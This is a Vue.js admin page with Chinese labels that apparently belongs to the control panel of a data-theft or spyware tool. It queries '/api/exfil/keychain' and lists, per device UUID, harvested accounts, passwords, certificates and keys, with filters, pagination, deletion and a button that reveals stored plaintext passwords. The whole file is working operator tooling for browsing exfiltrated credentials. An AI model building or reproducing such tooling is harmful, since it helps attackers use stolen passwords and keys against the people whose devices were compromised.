<template>
  <div class="keychain">
    <el-card>
      <div class="search-bar">
        <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
        <el-input v-model="filters.account" placeholder="账号" style="width: 200px;" />
        <el-select v-model="filters.service" placeholder="服务类型">
          <el-option label="全部" value="" />
          <el-option label="密码" value="password" />
          <el-option label="证书" value="certificate" />
          <el-option label="密钥" value="key" />
        </el-select>
        <el-button type="primary" @click="loadKeychain">查询</el-button>
        <el-button @click="resetFilters">重置</el-button>
      </div>
      
      <el-table :data="keychainData" border v-loading="loading">
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="device_uuid" label="设备UUID" width="250" />
        <el-table-column prop="service" label="服务" width="150">
          <template #default="scope">
            <el-tag :type="getServiceType(scope.row.service)">{{ getServiceName(scope.row.service) }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="account" label="账号" />
        <el-table-column prop="password" label="密码" show-overflow-tooltip>
          <template #default="scope">
            <span>{{ scope.row.password || '******' }}</span>
            <el-button size="small" @click="togglePassword(scope.row)" v-if="scope.row.password">显示</el-button>
          </template>
        </el-table-column>
        <el-table-column prop="created_at" label="创建时间" width="180" />
        <el-table-column label="操作" width="100">
          <template #default="scope">
            <el-button size="small" type="danger" @click="deleteItem(scope.row.id)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive } from 'vue'
import axios from '../utils/axios'

const keychainData = ref([])
const loading = ref(false)

const filters = reactive({
  device_uuid: '',
  account: '',
  service: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

function getServiceType(service) {
  const types = { 'password': 'warning', 'certificate': 'success', 'key': 'danger' }
  return types[service] || 'info'
}

function getServiceName(service) {
  const names = { 'password': '密码', 'certificate': '证书', 'key': '密钥' }
  return names[service] || service
}

function togglePassword(row) {
  row.password = row.password === '******' ? row.original_password : '******'
}

async function loadKeychain() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.account) params.append('account', filters.account)
    if (filters.service) params.append('service', filters.service)
    
    const response = await axios.get(`/api/exfil/keychain?${params}`)
    keychainData.value = response.data.map(item => ({ ...item, password: item.password ? '******' : '', original_password: item.password }))
  } catch (error) {
    console.error('加载数据失败:', error)
  } finally {
    loading.value = false
  }
}

async function deleteItem(id) {
  if (!confirm('确定要删除这条记录吗？')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadKeychain()
  } catch (error) {
    console.error('删除失败:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.account = ''
  filters.service = ''
  loadKeychain()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadKeychain()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadKeychain()
}

loadKeychain()
</script>

<style scoped>
.search-bar {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}
</style>
